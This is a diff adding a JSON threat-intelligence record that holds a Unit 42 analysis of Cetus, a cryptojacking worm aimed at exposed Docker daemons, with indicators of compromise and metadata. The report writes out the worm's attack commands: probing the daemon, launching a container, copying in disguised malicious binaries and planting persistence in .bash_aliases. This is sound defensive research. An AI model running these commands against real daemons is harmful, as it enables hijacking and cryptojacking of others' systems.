@@ -1,0 +1,76 @@
+{
+    "id": "6df6efaa-934d-4041-b133-0962e8e570c0",
+    "created_at": "2023-01-12T15:04:06.076138Z",
+    "updated_at": "2025-03-27T02:12:11.07238Z",
+    "deleted_at": null,
+    "sha1_hash": "a8433a46d301fa5d81e8de58c40744f89d5148a3",
+    "title": "2020-08-27 - Cetus- Cryptojacking Worm Targeting Docker Daemons",
+    "authors": "",
+    "file_creation_date": "2022-05-28T19:06:54Z",
+    "file_modification_date": "2022-05-28T19:06:54Z",
+    "file_size": 691811,
+    "plain_text": "# Cetus: Cryptojacking Worm Targeting Docker Daemons\n\n**unit42.paloaltonetworks.com/cetus-cryptojacking-worm/**\n\nAviv Sasson August 27, 2020\n\nBy [Aviv Sasson](https://unit42.paloaltonetworks.com/author/aviv-sasson/)\n\nAugust 27, 2020 at 6:00 AM\n\n[Category: Cloud,](https://unit42.paloaltonetworks.com/category/cloud/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [cetus,](https://unit42.paloaltonetworks.com/tag/cetus/) [Cryptocurrency,](https://unit42.paloaltonetworks.com/tag/cryptocurrency/) [cryptojacking,](https://unit42.paloaltonetworks.com/tag/cryptojacking/) [Docker,](https://unit42.paloaltonetworks.com/tag/docker/) [Docker Daemon,](https://unit42.paloaltonetworks.com/tag/docker-daemon/) [Docker vulnerability,](https://unit42.paloaltonetworks.com/tag/docker-vulnerability/) [Worm](https://unit42.paloaltonetworks.com/tag/worm/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/cetus-cryptojacking-worm/)\n\n## Executive Summary\n\nUnsecured Docker daemons have been known to security professionals as a major threat since the early days of containers.\n[Unit 42 recently wrote about Graboid, the first-ever Docker cryptojacking worm and](https://unit42.paloaltonetworks.com/graboid-first-ever-cryptojacking-worm-found-in-images-on-docker-hub/) [unsecured Docker daemons. I conducted](https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/)\nadditional research by setting up a Docker daemon honeypot in order to examine how things look for an average Docker\ndaemon in the wild and learn if the shift to the cloud caused by COVID-19 increased the prevalence and sophistication of\ntargeted cloud attacks.\n\nThis blog will detail the discovery of Cetus, a new and improved Docker cryptojacking worm mining for Monero that was\nfound in a Docker daemon honeypot we created. Cetus was created by TeamTnT, a group that's been attacking AWS and\nDocker daemons.\n\n[Palo Alto Networks customers running Prisma Cloud are protected from this through the Prisma Cloud Compute host](https://www.paloaltonetworks.com/prisma/cloud)\ncompliance protection, which alerts on an insufficient Docker daemon configuration and suggests a solution.\n\n## The Honeypot\n\nTo conduct the research, I set isolated restricted Docker daemons and logged all the traffic coming through for the month of\nMay. During that period of time, I witnessed various kinds of attacks, delivering anything from botnets to worms, and most of\nthem were for the purpose of cryptojacking, especially for Monero.\n\n\n-----\n\nOne of the most frequent attacks captured my attention because it had a potential pattern of a worm. Unlike other attacks,\nhere the honeypot was attacked from many different unsecured Docker daemon instances. According to my honeypot\ndeployments and other research projects on container security, it is not common to see worms targeting unsecured Docker\ndaemons. I decided to analyze the payload and determined that this was a new Docker worm: Each instance of the malware\nattempts to discover and infect other Docker daemon instances, in the local network and outside.\n\n## How Cetus Works\n\nIn Greek mythology, there are stories about a whale-like creature that looks innocuous but is actually a sea monster that\nwreaks havoc wherever it goes. The name of that creature is Cetus. Since the malware is aiming for Docker daemons and\ntrying to disguise itself as legitimate binaries, I decided to name it Cetus.\n\nCetus disguises itself by impersonating a legitimate binary that is frequently used in Docker environments called Portainer.\n[Portainer is a user interface (UI) management tool that offers a convenient way to manage multiple Docker environments.](https://github.com/portainer/portainer)\n[While taking over a new machine, Cetus copies itself to the victim and deploys an XMRig cryptominer payload. Cetus](https://github.com/xmrig/xmrig)\ndisguises the cryptominer as a different legitimate binary called docker-cache. It looks like a legitimate name but, unlike\nPortainer, it is not a name of a genuine binary.\n\nFigure 1. Cetus life cycle.\n\n\n-----\n\n[The infection mechanism is simple and effective. Cetus uses Masscan to randomly scan subnets for Docker daemons and,](https://github.com/robertdavidgraham/masscan)\nonce it finds one, it tries to spread by sending requests to daemon’s REST API. To add insult to injury, Cetus crafts these\nrequests by using the Docker command line interface (CLI) tool.\n\nThe attack flow of Cetus is described in Figure 1. Specifically, the commands that Cetus runs are:\n\nCheck the daemon is exploitable and was not infected:\n\nShell\n\n1 docker -H <victim> ps -a\n\nRun a new container of ubuntu:18.04 from Docker Hub:\n\nShell\n\n1 docker -H <victim> run -dt --name <name> --restart always ubuntu:18.04 /bin/bash\n\nUpdate the package manager lists:\n\nShell\n\n1 docker -H <victim> exec <name> apt-get -yq update\n\nInstall Masscan and Docker through the package manager:\n\nShell\n\n1 docker -H <victim> exec <name> apt-get install masscan docker.io\n\nCopy the malicious portainer and docker-cache binaries to the container:\n\nShell\n\n\n1\n2\n\n\ndocker -H <victim> cp -L docker-cache <name>:/usr/bin/\ndocker -H <victim> cp -L portainer <name>/usr/bin/\n\nAdd Cetus to “/root/.bash_aliases. It will cause Cetus to run every time the container restarts or root starts a bash\nsession:\n\n\nShell\n\n1 docker -H <victim> exec <name> bash --norc -c `echo /usr/bin/portainer <name> >/dev/null` 2>/dev/null &\n\nRestart the container in order to run Cetus:\n\nShell\n\n1 docker -H <victim> restart <name>\n\n## Reverse Engineering Cetus\n\nReverse engineering Cetus was easy and fast since it doesn’t use any anti-debugging or obfuscation techniques and even\nhas symbols. On the other hand, this was not the case with the miner. XMRig miner is one of the most widely used\ncryptominers for cryptojacking attacks, hence security tools treat it as a virus. Therefore, in order to deceive them in this\nattack, it was fully obfuscated, which made the reverse engineering process harder.\n\nIn addition, we can conclude the malware is new because it uses XMRig 5.5.3, which was released on Feb. 2, 2020.\n\n\n-----\n\nCetus s architecture is simple. It contains two main functions:\n\nminer_start and scan_start.\n\nFigure 2. Cetus main function.\n\nThe function miner_start is straightforward. It opens /var/log/stmp.log in order to log Cetus’s actions, and after that, it runs the\nXMRig cryptominer, which utilizes the machine’s CPU in order to mine Monero.\n\nThe function scan_start is much more interesting and executes the core malware functionality. It picks a random 16-bit\nsubnet and runs Masscan in order to scan the subnet for Docker daemons on port 2375. When it finds a daemon, it starts the\ninfection process using the Docker CLI tool that was already downloaded.\n\nAn interesting thing about the malware is that every time it infects a Docker daemon, it calls the container in a different name.\nIt has two lists of eight names each, and it randomly picks a name from each list and links them.\n\nFigure 3. Malicious container names.\n\n[Then Cetus will run the miner with the name as an argument. The miner will identify itself to the mining pool with this name](https://en.wikipedia.org/wiki/Mining_pool)\nand send the actor information about the mining. That will allow the attacker to classify each miner and create statistics about\nthe miners and the campaign through the mining pool API.\n\nWe can conclude from this and the logs mechanism that the operator of this worm wants to monitor everything carefully.\n\n## Conclusion\n\nMalware targeting containers will gradually become more complex as attackers understand the potential of the cloud. This is\nthe second Docker cryptojacking worm documented by Unit 42 after Graboid. In addition, we were able to link Cetus to\n[TeamTNT, a group that's been attacking AWS and Docker daemons that used the same Monero wallet address as Cetus.](https://www.cadosecurity.com/2020/08/17/teamtnt-the-first-crypto-mining-worm-to-steal-aws-credentials/)\nWe conclude that there is a growing trend of sophisticated attacks on the cloud.\n\n[Palo Alto Networks customers running Prisma Cloud are protected from this through the Prisma Cloud Compute host](https://www.paloaltonetworks.com/prisma/cloud)\ncompliance protection, which alerts on an insufficient Docker daemon configuration and suggests a solution.\n\n\n-----\n\nFigure 4. Prisma Cloud host alert\n\n**Indicator of Compromise**\n\n**Files**\n\nFilename SHA256\n\ndocker-cache e03cf2af46ad1fe590e63f0020243c6e8ae94f074e65ace18c6d568283343dac\n\nportainer b49a3f3cb4c70014e2c35c880d47bc475584b87b7dfcfa6d7341d42a16ebe443\n\n_Table 1.Malware hashes_\n\n**Mining Information**\n\n**Pool**\n\npool.minexmr.com:443\n\n**Payment Address**\n\n85X7JcgPpwQdZXaK2TKJb8baQAXc3zBsnW7JuY7MLi9VYSamf4bFwa7SEAK9Hgp2P53npV19w1zuaK5bft5m2NN71CmNLoh\n\n**Container Names**\n\nbaleful_gormmet\n\nbaleful_obelus\n\nbaleful_agelast\n\nbaleful_amatorculist\n\nbaleful_peristeronic\n\nbaleful_hirquiticke\n\nbaleful_oxter\n\nbaleful_quire\n\nboorish_gormmet\n\nboorish_obelus\n\nboorish_agelast\n\nboorish_amatorculist\n\nboorish_peristeronic\n\nboorish_hirquiticke\n\nboorish_oxter\n\nboorish_quire\n\nadroit_gormmet\n\nadroit_obelus\n\nadroit agelast\n\n\n-----\n\nadroit_amatorculist\n\nadroit_peristeronic\n\nadroit_hirquiticke\n\nadroit_oxter\n\nadroit_quire\n\nfecund_gormmet\n\nfecund_obelus\n\nfecund_agelast\n\nfecund_amatorculist\n\nfecund_peristeronic\n\nfecund_hirquiticke\n\nfecund_oxter\n\nfecund_quire\n\nlimpid_gormmet\n\nlimpid_obelus\n\nlimpid_agelast\n\nlimpid_amatorculist\n\nlimpid_peristeronic\n\nlimpid_hirquiticke\n\nlimpid_oxter\n\nlimpid_quire\n\nrisible_gormmet\n\nrisible_obelus\n\nrisible_agelast\n\nrisible_amatorculist\n\nrisible_peristeronic\n\nrisible_hirquiticke\n\nrisible_oxter\n\nrisible_quire\n\nverdant_gormmet\n\nverdant_obelus\n\nverdant_agelast\n\nverdant_amatorculist\n\n\n-----\n\nverdant_peristeronic\n\nverdant_hirquiticke\n\nverdant_oxter\n\nverdant_quire\n\nzealous_gormmet\n\nzealous_obelus\n\nzealous_agelast\n\nzealous_amatorculist\n\nzealous_peristeronic\n\nzealous_hirquiticke\n\nzealous_oxter\n\nzealous_quire\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-27 - Cetus- Cryptojacking Worm Targeting Docker Daemons.pdf"
+    ],
+    "report_names": [
+        "2020-08-27 - Cetus- Cryptojacking Worm Targeting Docker Daemons.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
+            "created_at": "2023-01-06T13:46:39.186988Z",
+            "updated_at": "2025-03-27T02:00:03.016358Z",
+            "deleted_at": null,
+            "main_name": "TeamTNT",
+            "aliases": [
+                "Adept Libra"
+            ],
+            "source_name": "MISPGALAXY:TeamTNT",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
+            "created_at": "2022-10-25T15:50:23.334495Z",
+            "updated_at": "2025-03-27T02:00:55.445098Z",
+            "deleted_at": null,
+            "main_name": "TeamTNT",
+            "aliases": [
+                "TeamTNT"
+            ],
+            "source_name": "MITRE:TeamTNT",
+            "tools": [
+                "Peirates",
+                "MimiPenguin",
+                "LaZagne",
+                "Hildegard"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535846,
+    "ts_updated_at": 1743041531,
+    "ts_creation_date": 1653764814,
+    "ts_modification_date": 1653764814,
+    "files": {
+        "pdf": "https://archive.orkl.eu/a8433a46d301fa5d81e8de58c40744f89d5148a3.pdf",
+        "text": "https://archive.orkl.eu/a8433a46d301fa5d81e8de58c40744f89d5148a3.txt",
+        "img": "https://archive.orkl.eu/a8433a46d301fa5d81e8de58c40744f89d5148a3.jpg"
+    }
+}
